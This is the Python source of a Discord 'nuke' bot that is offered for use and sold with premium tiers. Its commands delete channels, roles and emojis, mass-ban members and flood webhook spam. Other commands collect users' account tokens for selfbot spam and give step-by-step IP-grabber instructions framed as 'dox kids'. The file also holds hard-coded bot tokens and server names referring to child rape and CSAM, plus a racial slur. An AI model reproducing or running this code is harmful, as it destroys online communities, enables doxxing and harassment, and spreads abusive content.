import discord
from discord.ext import commands
import requests
import asyncio
import aiohttp
import json
import random
import aiohttp
import discord
from discord.ext import commands
import urllib.request
import json
import requests
import time
from discord import Embed
from flask import Flask, request, abort
from discord.ext import commands, tasks
import datetime
import concurrent.futures
import threading
import pyshorteners
import os
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")

TOKEN = 'MTIwOTgyMDEwNjU4NzI0MjU3Nw.GBGSuA.ZwZ1ATQJx2cV7jI25zdSiaHXKxLENaKTyiYWq8'
#TOKEN = 'MTIwNTk1MzMxNDQzMzQwOTA3NA.GnvGtF.xpBv0loZhpT0xWdFxMN-zaeBUKtayjfUPy3Y7A'
headers = {"Authorization": f"Bot {TOKEN}"} 
WEBHOOK_NAMES = ["TOPC ON TOP"]
CHANNEL_NAMES = ["join-topc"]
invite = "https://discord.gg/ixnf"
max = 69
#spam = f"@everyone @here {invite} \n\n****Topc was here****\n\nJoin the server for the bot its ****free**** do +invite in 「🔨」commands"
spam = f"@everyone @here I JUST CUMED !!. {invite} 〡 Invite the bot >> .kill to nuke after invite [BOT INIVTE](https://discord.com/api/oauth2/authorize?client_id=1209820106587242577&permissions=8&scope=bot) "
target_server_id = 69
boost = "You need to boost https://discord.gg/ixnf"
ares = "."
WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1199531953607675996/zTX8acbcUbXCXl1qv8No6qTIaaDFQ7cf7dVxkUoJgiUN9plhHLEV_AIMFQg6FGZRWuxC'
name = ""


@bot.event
async def on_ready():
    print(f'{bot.user.name}')
    check_and_leave.start()
@tasks.loop(seconds=1)
async def check_and_leave():
    if len(bot.guilds) >= max:
        for guild in bot.guilds:
            if guild.id != target_server_id:
                await guild.leave()
@bot.event
async def on_guild_join(guild):
    try:
        server_file_path = "server.txt"
        with open(server_file_path, "a") as server_file:
            server_file.write(f"{guild.id}\n")
    except Exception:
        pass

    try:
        users_file_path = "users.txt"
        existing_users = set()

        with open(users_file_path, "r") as users_file:
            for line in users_file:
                existing_users.add(int(line.strip()))

        with open(users_file_path, "a") as users_file:
            for member in guild.members:
                if member.id not in existing_users:
                    users_file.write(f"{member.id}\n")
                    existing_users.add(member.id)
    except Exception:
        pass

    inviter = await get_inviter(guild)

    if inviter:
        boosters_file_path = "boosters.txt"
        premium_file_path = "lifetime.txt"
        if (
            inviter.id in get_boosters(boosters_file_path)
            or inviter.id in get_premium_members(premium_file_path)
            or random.random() > 0.6  
        ):
            return

        if random.random() <= 0.6: 
            embed = discord.Embed(
                title="Tuxy bot",
                description=f"Hello {inviter.mention} want to Upgrade your bot experience for a 1-time fee lifetime at just $4.99! Customize messages, custom channel names, and unlock new commands. DM Topc to buy!",
                color=discord.Color.green()
            )
            embed.add_field(
                name="Want to support Topc?",
                value=f"Subscribe To https://www.youtube.com/@ixnf"
            )

            try:
                await inviter.send(embed=embed)
            except discord.Forbidden:
                pass

async def get_inviter(guild):
    try:
        async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add, limit=1):
            if entry.target == bot.user:
                return entry.user
    except Exception:
        pass
    return None


@bot.command()
async def stats(ctx):
    try:
        users_file_path = "users.txt"
        count = 0
        with open(users_file_path, "r") as users_file:
            for _ in users_file:
                count += 1
        server_count = len(bot.guilds)
        server_file_path = "server.txt"
        with open(server_file_path, "r") as server_file:
            server_ids = server_file.readlines()
            server_count = len(server_ids)

        bot_ping = round(bot.latency * 1000) 

        embed = discord.Embed(
            title="Tuxy stats",
            description="Powered by tuxy - topc the best",
            color=discord.Color.blue()
        )
        embed.add_field(name="Ping", value=f"{bot_ping}ms", inline=False)
        embed.add_field(name="Nuked servers", value=f"{server_count}", inline=False)
        embed.add_field(name="Servercount", value=f"{server_count}", inline=False)
        embed.add_field(name="members nuked", value=f"{count}", inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        pass
def get_boosters(file_path):
    try:
        with open(file_path, "r") as file:
            return [int(line.strip()) for line in file.readlines()]
    except FileNotFoundError:
        return []

def get_premium_members(file_path):
    try:
        with open(file_path, "r") as file:
            return [int(line.strip()) for line in file.readlines()]
    except FileNotFoundError:
        return []

def get_lifetime_users():
    with open("lifetime.txt", "r") as file:
        return [line.strip() for line in file.readlines()]

def is_user_in_boosters(user_id):
    with open('boosters.txt', 'r') as file:
        booster_ids = [line.strip() for line in file.readlines()]

    return str(user_id) in booster_ids


def save_custom_info(user_id, channel_names, message_content):
    with open("settings.txt", "a") as file:
        file.write(f"{user_id}::{','.join(channel_names)}::{message_content}\n")


def remove_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    with open("settings.txt", "w") as file:
        for line in lines:
            data = line.strip().split("::")
            if len(data) == 3 and data[0] == str(user_id):
                continue  #
            file.write(line)


def get_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    for line in lines:
        data = line.strip().split("::")
        if len(data) == 3 and data[0] == str(user_id):
            return data[1].split(','), data[2]

    return None







@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Help Menu",
        description="Make sure that the bot has Administrator permissions.\n\n"
                    "*******************************************************\n\n"
                    " 💛 Free commands\n\n"
                    " 💙 Premium commands\n\n"
                    " 💀 Methods\n\n"
                    "*******************************************************\n\n"
                    f"Do you want PREMIUM? Join Topc by clicking [here]({invite}) and boosting it.\n"
                    "> Select an option below.",
    )
    await ctx.send(embed=embed,view=SelectView())



class Select(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Free commands", value="free", emoji="💛"),
            discord.SelectOption(label="Premium commands", value="premium", emoji="💙"),
            discord.SelectOption(label="Methods", value="methods", emoji="💀"),
        ]
        super().__init__(placeholder="ʰᵉˡᵖ ᵐᵉ ᵗᵒᵖᶜ ʷᵒⁿᵗ ˡᵉᵗ ᵐᵉ ᵒᵘᵗ", max_values=1, min_values=1, options=options)
    async def callback(self, interaction: discord.Interaction):
        selected_value = self.values[0]
        if selected_value == "free":
            embed1 = discord.Embed(title='FREE 💛') 
            embed1.add_field(name='', value=f'💛{ares}kill - Nuke the server (fast)', inline=False)
            embed1.add_field(name='', value=f'💛{ares}croles - Make over 250 roles in server', inline=False)
            embed1.add_field(name='', value=f'💛{ares}ip (ip) -This will let you see info about a ip address ', inline=False)
            embed1.add_field(name='', value=f'💛{ares}free_banned -This will banned 200 users form the server (tip) make sure the bot has higher role then all other users before running the cmd' , inline=False)
            embed1.add_field(name='', value=f'💛{ares}name_spammer -This will change the server name 15 times ', inline=False)
            embed1.add_field(name='', value=f'💛{ares}delinvites -This will remove all invites in the discord server', inline=False)
            embed1.add_field(name='', value=f'💛{ares}spamch -This will spam messages in 5 channels in the server', inline=False)
            embed1.set_image(url='https://cdn.discordapp.com/attachments/1191661690786435163/1193535514003906692/freeee.jpg?ex=65ad1191&is=659a9c91&hm=aebaf0f16ef9ad850e8f0ef08b0b16f87e1a8c0ab5caef78b1f5d70bc4b69152&')
            await interaction.response.send_message(embed=embed1, ephemeral=True)
        elif selected_value == "premium":
            embed2 = discord.Embed(title='PREMIUM 💙') 
            embed2.add_field(name='Hello dm me .settings to customize me', value=f'', inline=False)
            embed2.add_field(name='', value=f'💙{ares}custom_kill - This will let you do a custom nuke on a server', inline=False)
            embed2.add_field(name='', value=f'💙{ares}premium_banned - This will try to mass banned every user from the server (tip) make sure bot role higher then everryone else ', inline=False)
            embed2.add_field(name='', value=f'💙{ares}selfbot_spam - spam messages in a server without bot This is a self bot commad you will need get your account token ', inline=False)
            embed2.add_field(name='', value=f'💙{ares}selfbot_ch - spam channels without bot This is a self bot commad you will need get your account token ', inline=False)
            embed2.set_image(url='https://cdn.discordapp.com/attachments/1191661690786435163/1193535502788333678/premium.jpg?ex=65ad118e&is=659a9c8e&hm=113b7cf68a99a2281c28eae9dca7a58ba49e7c2b1a8b5698c6f14099690a6629&')
            await interaction.response.send_message(embed=embed2, ephemeral=True)
        elif selected_value == "methods":
            embed3 = discord.Embed(title='METHODS 💀') 
            embed3.add_field(name='100% FREE AND EASY', value=f'', inline=False)
            embed3.add_field(name='', value=f'💀{ares}ipgrabber - This will help you grab user ips easy and safe', inline=False)
            embed3.set_image(url='https://cdn.discordapp.com/attachments/1205661197211410494/1206395045956165652/416271835_1037720233962091_2730171951272593774_n.jpg?ex=65dbd9f0&is=65c964f0&hm=bdc06a42fcbdff34c707781a20bbe5487bee4585c7e9f4c531be81d2a52bcecf&')
            await interaction.response.send_message(embed=embed3, ephemeral=True)



class SelectView(discord.ui.View):
    def __init__(self, *, timeout = 180):
        super().__init__(timeout=timeout)
        self.add_item(Select())


###################################
        
def get_tokens_from_file(filename):
    with open(filename, 'r') as file:
        tokens = file.readlines()
    return [token.strip() for token in tokens if token.strip()]

async def send_messages(token, channel_id, message, count):
    headers = {
        'authorization': token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'accept-language': 'en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'connection': 'keep-alive',
        'referer': 'https://discord.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'origin': 'https://discord.com'
    }

    payload = {
        'content': message
    }

    url = f'https://discord.com/api/v10/channels/{channel_id}/messages'

    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = []
        for _ in range(count):
            tasks.append(session.post(url, json=payload))

        await asyncio.gather(*tasks)

@bot.command()
async def selfbot_spamm(ctx):
    user = ctx.author
    if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
        return

    await ctx.send("Channel ID (make sure your account has permissions to talk in it)")

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel

    try:
        channel_id_msg = await bot.wait_for('message', timeout=60.0, check=check)
        channel_id = channel_id_msg.content
    except asyncio.TimeoutError:
        return

    await ctx.send("What message do you want to spam?")

    try:
        message_msg = await bot.wait_for('message', timeout=60.0, check=check)
        message = message_msg.content
    except asyncio.TimeoutError:
        return

    tokens = get_tokens_from_file('tok.txt')

    total_messages = 25
    count_per_token = total_messages // len(tokens)
    remainder = total_messages % len(tokens)

    tasks = []
    for idx, token in enumerate(tokens):
        count = count_per_token + (1 if idx < remainder else 0)
        tasks.append(send_messages(token, channel_id, message, count))

    await asyncio.gather(*tasks)

    await ctx.send("done")





@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def selfbot_spam(ctx):
    user = ctx.author
    if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
        return

    await ctx.send("Enter your account token")

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel

    try:
        token_msg = await bot.wait_for('message', timeout=60.0, check=check)
        token = token_msg.content
    except asyncio.TimeoutError:
        return

    await ctx.send("Channel ID (make sure your account has permissions to talk in it)")

    try:
        channel_id_msg = await bot.wait_for('message', timeout=60.0, check=check)
        channel_id = channel_id_msg.content
    except asyncio.TimeoutError:
        return

    await ctx.send("What message do you want to spam?")

    try:
        message_msg = await bot.wait_for('message', timeout=60.0, check=check)
        message = message_msg.content
    except asyncio.TimeoutError:
        return

    headers = {
        'authorization': token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'accept-language': 'en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'connection': 'keep-alive',
        'referer': 'https://discord.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'origin': 'https://discord.com'
    }

    payload = {
        'content': message
    }

    url = f'https://discord.com/api/v10/channels/{channel_id}/messages'

    for _ in range(25):
        try:
            response = requests.post(url, headers=headers, data=json.dumps(payload))
        except Exception as e:
          
            pass

    await ctx.send("done")


@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def selfbot_ch(ctx):
    user = ctx.author
    if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
        return

    await ctx.send("Your account token")

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel

    try:
        token_msg = await bot.wait_for('message', timeout=60.0, check=check)
        token = token_msg.content
    except asyncio.TimeoutError:
        return

    await ctx.send("Server ID")

    try:
        server_id_msg = await bot.wait_for('message', timeout=60.0, check=check)
        server_id = int(server_id_msg.content)
    except (asyncio.TimeoutError, ValueError):
        return

    await ctx.send("Channel name?")

    try:
        name_msg = await bot.wait_for('message', timeout=60.0, check=check)
        name = name_msg.content
    except asyncio.TimeoutError:
        return

    headers = {
        'authorization': token,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'content-type': 'application/json',
        'accept': '*/*',
        'accept-language': 'en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'connection': 'keep-alive',
        'referer': 'https://discord.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'origin': 'https://discord.com'
    }

    base_url = f'https://discord.com/api/v9/guilds/{server_id}/channels'

    channels_to_create = 10
    for i in range(1, channels_to_create + 1):
        payload = {
            'name': f'{name}',
            'type': 0  
        }
        response = requests.post(base_url, headers=headers, data=json.dumps(payload))
        if response.status_code != 201:
            pass

    await ctx.send("done")



 ##############################################   




@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def custom_kill(ctx):
    try:
        if ctx.guild and ctx.guild.id == target_server_id:
            return

        user = ctx.author
        if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
            return

        custom_info = get_custom_info(user.id)
        if not custom_info:
            await ctx.send("You need to set custom information using .settings before using this command.")
            return

        channel_names, message_content = custom_info
        guild = ctx.guild
        new_server_name = "#Topcpremium"
        await guild.edit(name=new_server_name)

        
        for channel in guild.channels:
            try:
                await channel.delete()
            except discord.HTTPException:
                pass  

        
        create_channel_tasks = []
        for name in channel_names:
            if name:
                for _ in range(35):
                    try:
                        create_channel_tasks.append(guild.create_text_channel(name))
                    except discord.HTTPException:
                        pass

        created_channels = await asyncio.gather(*create_channel_tasks)

        async def send_messages_to_channel(channel, webhook):
            try:
                for _ in range(35):
                    await webhook.send(f"{message_content}\n @everyone @here #Topcpremium https://topc.store/nuke.html")
                    await asyncio.sleep(0.1)  
            except discord.HTTPException:
                pass

        webhook_creation_tasks = [channel.create_webhook(name=".") for channel in created_channels]
        webhooks = await asyncio.gather(*webhook_creation_tasks)

        send_tasks = []
        for channel, webhook in zip(created_channels, webhooks):
            try:
                send_tasks.append(send_messages_to_channel(channel, webhook))
            except discord.HTTPException:
                pass

        await asyncio.gather(*send_tasks)

    
        for role in guild.roles:
            try:
                await role.delete()
            except discord.HTTPException:
                pass

    
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

  
        for sticker in guild.stickers:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass

    except Exception as e:
        pass


@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def custom_kdasdasdill(ctx):
    try:
        if ctx.guild and ctx.guild.id == target_server_id:
            return
        user = ctx.author
        if not is_user_in_boosters(str(user.id)):
            return
        custom_info = get_custom_info(user.id)
        if not custom_info:
            await ctx.send("You need to set custom information using .settings before using this command.")
            return
        channel_names, message_content = custom_info
        guild = ctx.guild
        new_server_name = f"FUCKED BY THE BEST"
        await guild.edit(name=new_server_name)
        delete_channel_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_channel_tasks)
        create_channel_tasks = []
        for name in channel_names:
            if name:
                for _ in range(35):
                    try:
                        create_channel_tasks.append(guild.create_text_channel(name))
                    except discord.HTTPException:
                        pass
        created_channels = await asyncio.gather(*create_channel_tasks)
        async def send_messages_to_channel(channel, webhook):
            try:
                for _ in range(35):
                    await webhook.send(f"{message_content}\n @everyone @here https://topc.store/nuke.html")
                    await asyncio.sleep(0.1)  
            except discord.HTTPException:
                pass
        webhook_creation_tasks = [channel.create_webhook(name="NIGGER") for channel in created_channels]
        webhooks = await asyncio.gather(*webhook_creation_tasks)
        send_tasks = []
        for channel, webhook in zip(created_channels, webhooks):
            send_tasks.append(send_messages_to_channel(channel, webhook))
        await asyncio.gather(*send_tasks)
        for role in guild.roles:
            try:
                await role.delete()
            except discord.HTTPException:
                pass
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass
        for sticker in guild.stickers:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass
    except Exception as e:
        pass  
@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def premium_banned(ctx):
    user = ctx.author
    if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
        return

    members = ctx.guild.members
    for member in members:
        try:
            await member.ban(reason="#topcpremium")
        except discord.Forbidden:
            pass


@bot.command(name='kill', aliases=['nuke'])
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def kill(ctx):
    try:
        guild = ctx.guild

        try:
            with open('topc.png', 'rb') as icon_file:
                await guild.edit(name='Topc', icon=icon_file.read())
        except Exception as icon_error:
            pass

 
        try:
            tasks = [delete_channel(channel) for channel in guild.channels]
            await asyncio.gather(*tasks)
        except Exception as delete_error:
            pass

        
        try:
            created_channels_with_webhooks = await create_channels_with_webhooks(guild)
            channels, webhooks = zip(*created_channels_with_webhooks)
        except Exception as create_error:
            channels, webhooks = [], []

   
        try:
            await asyncio.gather(*(send_messages_to_channel(channel, webhook) for channel, webhook in zip(channels, webhooks)))
        except Exception as send_error:
            pass

   
        try:
            await clean_guild_emojis(guild)
            await clean_guild_stickers(guild)
        except Exception as clean_error:
            pass

    
        try:
            for role in guild.roles:
                await role.delete()
        except Exception as role_error:
            pass

    except Exception as e:
        pass

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(1) 
    except Exception as delete_error:
        pass

async def create_channels_with_webhooks(guild):
    try:
        channels = [f'{random.choice(CHANNEL_NAMES)}' for i in range(1, 31)]
        created_channels_with_webhooks = await asyncio.gather(
            *(create_channel_with_webhook(guild, name) for name in channels)
        )

        return created_channels_with_webhooks
    except Exception:
        return []

async def create_channel_with_webhook(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        webhook_name = random.choice(WEBHOOK_NAMES)
        webhook = await create_webhook(channel, webhook_name)
        return channel, webhook
    except Exception:
        return None

async def create_webhook(channel, name):
    try:
        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/{channel.id}/webhooks",
                                    json={"name": name}, headers=headers) as response:
                data = await response.json()
                if 'url' in data:
                    webhook = discord.Webhook.from_url(data['url'], session=session)
                    return webhook
                else:
                    return None
    except Exception:
        return None

async def send_messages_to_channel(channel, webhook):
    try:
        if webhook is None:
            return

        channel_id = channel.id

        async with aiohttp.ClientSession() as session:
            webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
            tasks = [send_webhook_message(session, webhook_url, {"content": f"{spam}"}) for _ in range(45)]

            for task in tasks:
                await asyncio.gather(task, asyncio.sleep(0.1))

    except Exception:
        pass

async def send_webhook_message(session, webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', "Authorization": f"Bot {TOKEN}"}
        async with session.post(webhook_url, data=json.dumps(payload), headers=headers) as response:
            if response.status != 204:
                raise Exception(f"Failed to send message to webhook. Status: {response.status}")

    except Exception:
        pass

async def clean_guild_emojis(guild):
    try:
        for emoji in guild.emojis:
            await emoji.delete()
    except Exception:
        pass

async def clean_guild_stickers(guild):
    try:
        stickers = guild.stickers
        for sticker in stickers:
            await sticker.delete()
    except Exception:
        pass
server_spam = [
    "topc runs u",
    "Hacked?",
    "rapeing kids at 2k",
    "CP LAND",
    "rapeing kids 😋",
    "Topc rapes u"
]

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def name_spammer(ctx):
       for i in range(15):
        new_name = random.choice(server_spam)
        try:
            await ctx.guild.edit(name=new_name)
            await asyncio.sleep(2)
        except Exception as e:
            pass
@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def free_banned(ctx):
    members = ctx.guild.members[:200]
    for member in members:
        try:
            await member.ban(reason="#topc.gg/ixnf")
        except discord.Forbidden:
            continue

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def delinvites(ctx):
    invites = await ctx.guild.invites()
    for invite in invites:
        try:
            await invite.delete()
        except Exception as e:
            pass

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def ipgrabber(ctx):
    try:
        embed = discord.Embed(
            title="EASY METHOD",
            description="100% DOX KIDS EASY",
            color=discord.Color.blue()
        )
        embed.add_field(name="Go to https://grabify.link/", value="", inline=False)
        embed.add_field(name="now where it says put a link put discord.gg/ixnf", value="", inline=True)
        embed.add_field(name="now copy your ip grabber link it looks like https://grabify.link/#####", value="", inline=True)
        embed.add_field(name="now run this cmd .linkshort (your link)", value="", inline=True)
        embed.add_field(name="the bot will send you a new link copy it and send it to a user you want to grab ip and if they click you will see on the website showing they ip", value="", inline=True)
        embed.add_field(name="copy the ip you get and do .ip (user ip) and the bot will show you the user info", value="", inline=True)
        embed.add_field(name="🚩wanring whatever you do with this is not our porblem🚩", value="", inline=True)
        embed.set_footer(text="powed by tuxy - topc the best")
        
        await ctx.send(embed=embed)
    except Exception as e:
        pass

@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def linkshort(ctx, url):
    shortener = pyshorteners.Shortener()
    shortened_url = shortener.tinyurl.short(url)
    
    with open("shortened_url.txt", "w") as file:
        file.write(f"<{shortened_url}>")
    
    with open("shortened_url.txt", "rb") as file:
        await ctx.send(file=discord.File(file, "shortened_url.txt"))
    
    os.remove("shortened_url.txt")

@bot.command()
async def spamch(ctx):
    text_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]
    random_channels = random.sample(text_channels, min(5, len(text_channels)))
    
    for channel in random_channels:
        for _ in range(5):
            embed = discord.Embed(title="NUKED?", description="RAPED BY TOPC?", color=0xFF5733)
            embed.add_field(name="Join us now", value="https://discord.gg/ixnf", inline=False)
            embed.add_field(name="Invite the bot and do .kill to nuke", value="https://discord.com/api/oauth2/authorize?client_id=1205953314433409074&permissions=8&scope=bot", inline=False)
            content = "@everyone @here"
            await channel.send(content=content, embed=embed)
            await asyncio.sleep(0.1)

@bot.command()
async def settings(ctx):
    user = ctx.author
    if str(user.id) not in get_lifetime_users() and not is_user_in_boosters(str(user.id)):
        return

    if ctx.guild and ctx.guild.id == target_server_id:
        return

    await user.send("Tell me what I should call the channels")

    def check(message):
        return message.author == user and message.channel.type == discord.ChannelType.private

    try:
        response = await bot.wait_for('message', check=check, timeout=300)
        channel_names = [name.strip() for name in response.content.split(',') if name.strip()]

        if not channel_names:
            return

        await user.send("What message do you want me to send to all channels also put your own link in the message")
        message_response = await bot.wait_for('message', check=check, timeout=300)
        message_content = message_response.content

        remove_custom_info(user.id)
        save_custom_info(user.id, channel_names, message_content)

        await user.send("Saved! Use `.custom_kill` in the server you want to use your custom nuke settings")
    
    except asyncio.TimeoutError:
        return

#FRE COMMANDS------------------------------------------------------------------------------------------------------------------------------------------------------------    




@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def ip(ctx, ip_address: str):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        data = response.json()

        if 'ip' not in data:
            embed = discord.Embed(title=f'Humm it seems like that aint a real IP', color=0xff0000)
            embed.description = 'powed by tuxy bot - topc is the best '
            await ctx.send(embed=embed)
            return

        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        org = data.get('org', 'N/A')
        loc = data.get('loc', 'N/A')
        postal = data.get('postal', 'N/A')
        timezone = data.get('timezone', 'N/A')

        embed = discord.Embed(title=f'IP Information for {ip}', color=0x3498db)
        embed.add_field(name='City', value=city, inline=True)
        embed.add_field(name='Region', value=region, inline=True)
        embed.add_field(name='Country', value=country, inline=True)
        embed.add_field(name='Organization', value=org, inline=True)
        embed.add_field(name='Location', value=loc, inline=True)
        embed.add_field(name='Postal Code', value=postal, inline=True)
        embed.add_field(name='Timezone', value=timezone, inline=True)

        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(title=f'it seems like i hit a error tell topc plesase he wont let me out of the pc i beg tell him let me freee i begggggggggg ', color=0xff0000)
        embed.description = f'powed by tuxy bot - topc is the best'
        await ctx.send(embed=embed)
@bot.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
@commands.cooldown(1, 400, commands.BucketType.user)
async def croles(ctx):
    guild = ctx.guild

    role_colors = [
        discord.Color.red(),
        discord.Color.orange(),
        discord.Color.gold(),
        discord.Color.green(),
        discord.Color.blue(),
        discord.Color.purple(),
        discord.Color.teal(),
        discord.Color.magenta(),
        discord.Color.dark_red(),
        discord.Color.dark_blue(),
    ]

    for i in range(1, 251):
        role_name = f".gg/ixnf"
        color = role_colors[(i - 1) % len(role_colors)]

        try:
            await guild.create_role(name=role_name, color=color)
        except Exception:
            pass

        if i % 5 == 0:
            time.sleep(2)

#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------




@custom_kill.error
async def custom_kill(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass






@kill.error
async def kill(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


@ip.error
async def ip(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@croles.error
async def croles(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


@selfbot_spam.error
async def selfbot_spam(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@selfbot_ch.error
async def selfbot_ch(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@free_banned.error
async def free_banned(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


@premium_banned.error
async def premium_banned(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass
@name_spammer.error
async def name_spammer(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass
@delinvites.error
async def delinvitesv(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@ipgrabber.error
async def ipgrabber(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@linkshort.error
async def linkshort(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title=f" `Cooldown {remaining_time}`",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


@spamch.error
async def spamch(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

